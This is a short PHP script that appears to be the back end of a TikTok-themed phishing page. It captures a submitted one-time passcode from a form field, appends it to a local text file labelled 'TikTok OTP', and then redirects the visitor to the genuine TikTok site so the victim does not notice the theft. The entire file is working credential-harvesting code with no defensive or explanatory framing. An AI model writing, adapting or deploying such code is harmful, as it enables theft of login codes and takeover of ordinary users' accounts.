<?php
file_put_contents("otp.txt", "TikTok OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.tiktok.com/en/');
?>
